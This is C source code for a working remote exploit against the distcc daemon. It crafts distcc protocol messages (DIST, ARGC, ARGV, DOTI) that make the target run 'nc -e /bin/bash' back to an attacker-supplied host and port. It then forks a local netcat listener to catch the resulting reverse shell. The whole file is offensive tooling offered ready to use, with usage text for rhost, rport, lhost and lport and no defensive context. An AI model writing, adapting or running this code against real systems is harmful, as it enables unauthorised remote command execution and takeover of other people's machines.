#include <time.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define RED   "\e[0;31m"
#define GRN   "\e[0;32m"
#define RESET "\e[0m"

#define MAX   1024
#define ARGS  9

void handle_sigint(int sig) {
  puts("\n[!] Exiting");
  exit(1);
}

void exploit(char *rhost, char *rport, char *lhost, char *lport) {

  pid_t pid;

  if((pid = fork()) == -1) {
    fprintf(stderr, "[-] Unable to fork the process\n");
    exit(2);
  }

  if(pid == 0) {

    srand(time(NULL) * getpid());
  
    struct sockaddr_in serv_addr;
    struct sigaction sa;
    sa.sa_handler = &handle_sigint;
    sigaction(SIGINT, &sa, NULL);

    int i, sockfd;
    int rport_num = strtol(rport, NULL, 10);

    char command[MAX] = "nc -e /bin/bash ";

    char *args[ARGS] = {"sh", "-c", command, "#", "-c", "main.c", "-o", "main.o", NULL};
    char alphanumeric[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    char payload[MAX] = "DIST00000001ARGC00000008";
    char dtag[MAX] = "DOTI0000000A";
    char concat[MAX];
    char randchars[11];

    strcat(command, lhost);
    strcat(command, " ");
    strcat(command, lport);

    for(i=0; i<ARGS-1; i++) {
      snprintf(concat, sizeof(concat), "ARGV%08lx%s", strlen(args[i]), args[i]);
      strcat(payload, concat);
      memset(concat, '\0', sizeof(concat));
    }
  
    for(i=0; i<sizeof(randchars)-1; i++)
      randchars[i] = alphanumeric[rand() % strlen(alphanumeric)];

    strcat(dtag, randchars);

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
      fprintf(stderr, "[-] Unable to create socket\n");
      exit(2);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(rhost);
    serv_addr.sin_port = htons(rport_num);

    puts(GRN"[+] Connecting to the target..."RESET);
    sleep(1);

    if((connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))) == -1) {
      fprintf(stderr, "[-] Unable to connect to the server\n");
      exit(3);
    }

    puts(GRN"[+] Enjoy your shell :)\n"RESET);

    send(sockfd, payload, strlen(payload), 0);
    send(sockfd, dtag, strlen(dtag), 0);

  }else {

    char *args[] = {"nc", "-nlvp", lport, NULL};

    execvp("nc", args);

  }

}

int main(int argc, char **argv) {

  if(argc != 5) {
    fprintf(stderr, "[-] Incorrect amount of arguments supplied. Expected 4\n");
    fprintf(stderr, "[?] Usage: %s <rhost> <rport> <lhost> <lport>\n", argv[0]);
    fprintf(stderr, "[?] Make sure to write correctly the hosts and ports\n");
    return 1;
  }

  exploit(argv[1], argv[2], argv[3], argv[4]);
  return EXIT_SUCCESS;

}
